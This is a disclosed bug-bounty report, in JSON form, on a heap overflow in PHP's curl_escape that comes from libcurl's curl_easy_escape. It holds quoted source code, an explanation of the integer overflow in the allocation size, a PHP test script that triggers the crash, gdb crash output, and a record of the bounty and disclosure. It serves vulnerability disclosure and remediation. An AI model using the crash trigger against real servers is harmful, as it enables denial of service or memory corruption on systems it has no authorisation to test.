{"id":160295,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjAyOTU=","url":"https://hackerone.com/reports/160295","title":"Heap overflow in curl_escape","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-08-18T01:07:53.789Z","submitted_at":"2016-08-18T01:07:53.789Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"hoangnguyen","url":"/hoangnguyen","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/074/688/42c5ca5265ff965283d70fc52df2681dfd648d44_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":29,"url":"https://hackerone.com/ibb-php","handle":"ibb-php","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"PHP (IBB)","twitter_handle":"","website":"http://www.php.net","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-11-12T09:31:33.048Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-10-13T09:31:25.519Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I have founded a code block that leads to heap overflow. As you can see at :\n```\nPHP_FUNCTION(curl_escape)\n{\n        char       *str = NULL, *res = NULL;\n        size_t        str_len = 0;\n        zval       *zid;\n        php_curl   *ch;\n        *** SNIP ***\n        if ((res = curl_easy_escape(ch-\u003ecp, str, str_len))) {\n                RETVAL_STRING(res);\n                curl_free(res);\n        } else {\n                RETURN_FALSE;\n        }\n        *** SNIP ***\n}\n```\nI do some analysis with curl_easy_escape in libcurl and here the source code :\n```\nchar *curl_easy_escape(CURL *handle, const char *string, int inlength)\n{\n        size_t alloc = (inlength?(size_t)inlength:strlen(string))+1;\n        char *ns;\n        char *testing_ptr = NULL;\n        \n        *** SNIP ***\n        \n        ns = malloc(alloc);\n        if(!ns)\n            return NULL;\n\n        length = alloc-1;\n        while(length--) {\n            in = *string;\n            if (Curl_isalnum(in)) {\n            /* just copy this */\n                ns[strindex++]=in;\n        *** SNIP ***\n```\nHere you see that alloc is calculated by adding inlength with one. If we pass a string with length 0xfffffff in curl_escape\nand the alloc add it with 1 and the result of alloc is 0. After that, the malloc a buffer with size 0 and length = 0 - 1 = -1 = 0xfffffff\nthis leads to heap overflow\n\nTest script:\n---------------\n\u003c?php\n\nini_set('memory_limit',-1);\n\n$ch = curl_init('http://google.com');\ncurl_escape($ch,str_repeat(\"A\",0xffffffff));\n\n?\u003e\n```\nProgram received signal SIGSEGV, Segmentation fault.\n[----------------------------------registers-----------------------------------]\nRAX: 0x7ffff67ce508 (\u003ccurl_easy_escape+120\u003e:    mov    BYTE PTR [r14+r13*1],cl)\nRBX: 0x0 \nRCX: 0x41 ('A')\nRDX: 0x14 \nRSI: 0x7ffff67a2b20 --\u003e 0x100000000 \nRDI: 0x0 \nRBP: 0x7ffff67ff8ec --\u003e 0xfffcec1cfffcec1c \nRSP: 0x7fffffffa720 --\u003e 0x148fd80 ('A' \u003crepeats 200 times\u003e...)\nRIP: 0x7ffff67ce508 (\u003ccurl_easy_escape+120\u003e:    mov    BYTE PTR [r14+r13*1],cl)\nR8 : 0x7fffffffa5b8 --\u003e 0x0 \nR9 : 0x7fffffffa5b4 --\u003e 0x0 \nR10: 0x14773e0 --\u003e 0x79746974 ('tity')\nR11: 0x7ffff67ce490 (\u003ccurl_easy_escape\u003e:        push   r15)\nR12: 0x0 \nR13: 0x38c10 \nR14: 0x14773f0 ('A' \u003crepeats 200 times\u003e...)\nR15: 0x7ffeef038c28 ('A' \u003crepeats 200 times\u003e...)\nEFLAGS: 0x10213 (CARRY parity ADJUST zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x7ffff67ce4fc \u003ccurl_easy_escape+108\u003e:       add    rax,rbp\n   0x7ffff67ce4ff \u003ccurl_easy_escape+111\u003e:       jmp    rax\n   0x7ffff67ce501 \u003ccurl_easy_escape+113\u003e:       nop    DWORD PTR [rax+0x0]\n=\u003e 0x7ffff67ce508 \u003ccurl_easy_escape+120\u003e:       mov    BYTE PTR [r14+r13*1],cl\n   0x7ffff67ce50c \u003ccurl_easy_escape+124\u003e:       add    r13,0x1\n   0x7ffff67ce510 \u003ccurl_easy_escape+128\u003e:       mov    rax,QWORD PTR [rsp+0x10]\n   0x7ffff67ce515 \u003ccurl_easy_escape+133\u003e:       add    r15,0x1\n   0x7ffff67ce519 \u003ccurl_easy_escape+137\u003e:       sub    rax,r15\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffa720 --\u003e 0x148fd80 ('A' \u003crepeats 200 times\u003e...)\n0008| 0x7fffffffa728 --\u003e 0x7ffeef000018 ('A' \u003crepeats 200 times\u003e...)\n0016| 0x7fffffffa730 --\u003e 0xffffffffffffffff \n0024| 0x7fffffffa738 --\u003e 0x7ffeef000018 ('A' \u003crepeats 200 times\u003e...)\n0032| 0x7fffffffa740 --\u003e 0x148fd80 ('A' \u003crepeats 200 times\u003e...)\n0040| 0x7fffffffa748 --\u003e 0x0 \n0048| 0x7fffffffa750 --\u003e 0x7fffffffa7e0 --\u003e 0x7fffffffa810 --\u003e 0x7fffffffa840 --\u003e 0x7fffffffa880 --\u003e 0x7fffffffa990 --\u003e 0x7fffffffcc90 --\u003e 0x7fffffffe010 --\u003e 0x7fffffffe160 --\u003e 0xa28260 (\u003c__libc_csu_init\u003e:        push   r15)\n0056| 0x7fffffffa758 --\u003e 0x42cb20 (\u003c_start\u003e:    xor    ebp,ebp)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x00007ffff67ce508 in curl_easy_escape () from /usr/lib/x86_64-linux-gnu/libcurl.so.4\ngdb-peda$ bt\n#0  0x00007ffff67ce508 in curl_easy_escape () from /usr/lib/x86_64-linux-gnu/libcurl.so.4\n#1  0x00000000005ff72c in zif_curl_escape (execute_data=0x7fffef614110, return_value=0x7fffef614100)\n    at /home/hoangnguyen/Data/Build/audit/php-7.0.7/ext/curl/interface.c:3571\n```\nBug here : https://bugs.php.net/bug.php?id=72674","vulnerability_information_html":"\u003cp\u003eI have founded a code block that leads to heap overflow. As you can see at :\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePHP_FUNCTION(curl_escape)\n{\n        char       *str = NULL, *res = NULL;\n        size_t        str_len = 0;\n        zval       *zid;\n        php_curl   *ch;\n        *** SNIP ***\n        if ((res = curl_easy_escape(ch-\u0026gt;cp, str, str_len))) {\n                RETVAL_STRING(res);\n                curl_free(res);\n        } else {\n                RETURN_FALSE;\n        }\n        *** SNIP ***\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI do some analysis with curl_easy_escape in libcurl and here the source code :\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003echar *curl_easy_escape(CURL *handle, const char *string, int inlength)\n{\n        size_t alloc = (inlength?(size_t)inlength:strlen(string))+1;\n        char *ns;\n        char *testing_ptr = NULL;\n\n        *** SNIP ***\n\n        ns = malloc(alloc);\n        if(!ns)\n            return NULL;\n\n        length = alloc-1;\n        while(length--) {\n            in = *string;\n            if (Curl_isalnum(in)) {\n            /* just copy this */\n                ns[strindex++]=in;\n        *** SNIP ***\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eHere you see that alloc is calculated by adding inlength with one. If we pass a string with length 0xfffffff in curl_escape\u003cbr\u003e\nand the alloc add it with 1 and the result of alloc is 0. After that, the malloc a buffer with size 0 and length = 0 - 1 = -1 = 0xfffffff\u003cbr\u003e\nthis leads to heap overflow\u003c/p\u003e\n\n\u003ch2 id=\"test-script\"\u003eTest script:\u003c/h2\u003e\n\n\u003cp\u003e\u0026lt;?php\u003c/p\u003e\n\n\u003cp\u003eini_set(\u0026#39;memory_limit\u0026#39;,-1);\u003c/p\u003e\n\n\u003cp\u003e$ch = curl_init(\u0026#39;\u003ca title=\"http://google.com\u0026#39;\" href=\"/redirect?url=http%3A%2F%2Fgoogle.com%27\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://google.com\u0026#39;\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e);\u003cbr\u003e\ncurl_escape($ch,str_repeat(\u0026quot;A\u0026quot;,0xffffffff));\u003c/p\u003e\n\n\u003cp\u003e?\u0026gt;\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eProgram received signal SIGSEGV, Segmentation fault.\n[----------------------------------registers-----------------------------------]\nRAX: 0x7ffff67ce508 (\u0026lt;curl_easy_escape+120\u0026gt;:    mov    BYTE PTR [r14+r13*1],cl)\nRBX: 0x0 \nRCX: 0x41 (\u0026#39;A\u0026#39;)\nRDX: 0x14 \nRSI: 0x7ffff67a2b20 --\u0026gt; 0x100000000 \nRDI: 0x0 \nRBP: 0x7ffff67ff8ec --\u0026gt; 0xfffcec1cfffcec1c \nRSP: 0x7fffffffa720 --\u0026gt; 0x148fd80 (\u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\nRIP: 0x7ffff67ce508 (\u0026lt;curl_easy_escape+120\u0026gt;:    mov    BYTE PTR [r14+r13*1],cl)\nR8 : 0x7fffffffa5b8 --\u0026gt; 0x0 \nR9 : 0x7fffffffa5b4 --\u0026gt; 0x0 \nR10: 0x14773e0 --\u0026gt; 0x79746974 (\u0026#39;tity\u0026#39;)\nR11: 0x7ffff67ce490 (\u0026lt;curl_easy_escape\u0026gt;:        push   r15)\nR12: 0x0 \nR13: 0x38c10 \nR14: 0x14773f0 (\u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\nR15: 0x7ffeef038c28 (\u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\nEFLAGS: 0x10213 (CARRY parity ADJUST zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x7ffff67ce4fc \u0026lt;curl_easy_escape+108\u0026gt;:       add    rax,rbp\n   0x7ffff67ce4ff \u0026lt;curl_easy_escape+111\u0026gt;:       jmp    rax\n   0x7ffff67ce501 \u0026lt;curl_easy_escape+113\u0026gt;:       nop    DWORD PTR [rax+0x0]\n=\u0026gt; 0x7ffff67ce508 \u0026lt;curl_easy_escape+120\u0026gt;:       mov    BYTE PTR [r14+r13*1],cl\n   0x7ffff67ce50c \u0026lt;curl_easy_escape+124\u0026gt;:       add    r13,0x1\n   0x7ffff67ce510 \u0026lt;curl_easy_escape+128\u0026gt;:       mov    rax,QWORD PTR [rsp+0x10]\n   0x7ffff67ce515 \u0026lt;curl_easy_escape+133\u0026gt;:       add    r15,0x1\n   0x7ffff67ce519 \u0026lt;curl_easy_escape+137\u0026gt;:       sub    rax,r15\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffa720 --\u0026gt; 0x148fd80 (\u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\n0008| 0x7fffffffa728 --\u0026gt; 0x7ffeef000018 (\u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\n0016| 0x7fffffffa730 --\u0026gt; 0xffffffffffffffff \n0024| 0x7fffffffa738 --\u0026gt; 0x7ffeef000018 (\u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\n0032| 0x7fffffffa740 --\u0026gt; 0x148fd80 (\u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\n0040| 0x7fffffffa748 --\u0026gt; 0x0 \n0048| 0x7fffffffa750 --\u0026gt; 0x7fffffffa7e0 --\u0026gt; 0x7fffffffa810 --\u0026gt; 0x7fffffffa840 --\u0026gt; 0x7fffffffa880 --\u0026gt; 0x7fffffffa990 --\u0026gt; 0x7fffffffcc90 --\u0026gt; 0x7fffffffe010 --\u0026gt; 0x7fffffffe160 --\u0026gt; 0xa28260 (\u0026lt;__libc_csu_init\u0026gt;:        push   r15)\n0056| 0x7fffffffa758 --\u0026gt; 0x42cb20 (\u0026lt;_start\u0026gt;:    xor    ebp,ebp)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x00007ffff67ce508 in curl_easy_escape () from /usr/lib/x86_64-linux-gnu/libcurl.so.4\ngdb-peda$ bt\n#0  0x00007ffff67ce508 in curl_easy_escape () from /usr/lib/x86_64-linux-gnu/libcurl.so.4\n#1  0x00000000005ff72c in zif_curl_escape (execute_data=0x7fffef614110, return_value=0x7fffef614100)\n    at /home/hoangnguyen/Data/Build/audit/php-7.0.7/ext/curl/interface.c:3571\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBug here : \u003ca title=\"https://bugs.php.net/bug.php?id=72674\" href=\"/redirect?url=https%3A%2F%2Fbugs.php.net%2Fbug.php%3Fid%3D72674\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bugs.php.net/bug.php?id=72674\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":2,"name":"Memory Corruption - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-11-12T09:31:25.595Z","allow_singular_disclosure_after":-35665531.70926227,"singular_disclosure_allowed":true,"vote_count":1,"voters":["dyabla"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1205760,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Did `libcurl` end up issuing a patch for this issue?","markdown_message":"\u003cp\u003eDid \u003ccode\u003elibcurl\u003c/code\u003e end up issuing a patch for this issue?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-09-20T04:38:23.860Z","updated_at":"2016-09-20T04:38:23.860Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"hoangnguyen","url":"/hoangnguyen"},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1205761,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2016-09-20T04:38:27.827Z","updated_at":"2016-09-20T04:38:27.827Z","actor":{"url":"/ibb-php","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PHP (IBB)"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"ibb-php","collaborator":{"username":"hoangnguyen","url":"/hoangnguyen"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6026229,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-13T09:31:25.533Z","updated_at":"2019-10-13T09:31:25.533Z","first_to_agree":true,"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6285786,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-11-12T09:31:33.063Z","updated_at":"2019-11-12T09:31:33.063Z","actor":{"url":"/ibb-php","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PHP (IBB)"}},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}